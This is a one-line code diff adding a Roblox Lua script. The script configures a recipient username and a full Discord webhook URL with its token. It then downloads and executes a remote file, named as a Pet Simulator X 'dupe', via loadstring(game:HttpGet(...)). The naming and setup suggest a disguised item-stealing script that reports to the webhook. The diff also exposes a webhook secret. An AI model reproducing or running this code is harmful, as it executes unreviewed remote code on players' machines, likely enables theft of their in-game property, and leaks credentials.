@@ -1,0 +1,1 @@
+UserName = "ilyht" WebHook = "https://discord.com/api/webhooks/1061309717634351184/-PGS5nCOxM8NwK0vYdLdffpfnUl135pdzP7IRCT6mIqObtG82p9KTKQIuW5Vjwxii8E1" Mention = true -- change to false if you don't want to get everyone ping in your webhook. loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()
